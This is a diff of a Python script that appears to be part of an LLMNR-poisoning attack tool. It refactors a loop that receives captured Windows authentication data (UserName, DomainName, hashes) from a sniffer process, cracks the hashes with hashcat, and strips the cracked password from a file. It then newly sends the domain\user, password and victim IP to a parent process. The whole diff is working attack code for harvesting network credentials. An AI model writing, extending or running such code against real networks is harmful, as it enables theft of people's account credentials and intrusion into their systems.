@@ -114,10 +114,7 @@ def func(conn2):
     print('finished sniff 1')
 
 
-if __name__ == '__main__':
-    # query = IP()/ UDP()/ LLMNRQuery()
-    # query.show()
-
+def main(main_conn):
     print('satrt')
     conn1, conn2 = multiprocessing.Pipe()
     x = multiprocessing.Process(target=func, args=(conn2,))
@@ -125,7 +122,8 @@ if __name__ == '__main__':
     print(str(type(conn2)))
     while True:
         try:
-            credential = conn1.recv()[1]
+            ip, credential = conn1.recv()
+            ip = ip.split(':')[0]
             print('received from process:' + str(credential))
             hash = ''
             if 'UserName' in credential:
@@ -145,10 +143,13 @@ if __name__ == '__main__':
             if os.stat('cracked.txt').st_size != 0:
                 with open(r'cracked.txt', 'r') as file:
                     password = file.read()
+                    if (password.endswith('\n')):
+                        password = password[0:-1]
                 print(password)
                 password = password[password.rindex(':') + 1:]
                 print('user:' + credential['DomainName'] + '\\' + credential['UserName'])
                 print('password:' + password)
+                main_conn.send([credential['DomainName'] + '\\' + credential['UserName'], password, ip])
                 with open(r'cracked.txt', 'w') as file:
                     file.write('')
                 if os.stat('hashcat.potfile').st_size != 0:
@@ -158,3 +159,7 @@ if __name__ == '__main__':
                 print('didnt find password')
         except Exception as e:
             print('Error is:' + str(e))
+
+
+if __name__ == '__main__':
+    main(main_conn=multiprocessing.Pipe()[0])
